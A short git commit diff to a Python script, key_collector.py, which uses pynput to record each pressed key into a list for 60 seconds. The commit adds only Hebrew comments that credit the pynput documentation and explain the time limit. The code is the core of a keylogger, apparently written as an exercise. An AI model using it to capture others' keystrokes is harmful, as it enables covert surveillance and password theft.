e49689795d0bc664e560e6c64605a5466fa07702
nadav <ndv459@gmail.com>
2025-06-18 01:34:47 +0300

    that's nadav's version

--- key_collector.py
+++ key_collector.py
@@ -19,8 +19,11 @@ def typing(key):
     else:
         pressed_key.append(str(key))
 
+# את הפקודות ייבאתי מ- https://pynput.readthedocs.io/en/latest/keyboard.html#monitoring-the-keyboard
+
 key_listener= keyboard.Listener(on_press=typing)
 key_listener.start()
+# הוספתי כאן מגבלת זמן להרצת התוכנה כי לא הצלחתי לעשות יציאה נוחה
 time.sleep(60)
 key_listener.stop()
 
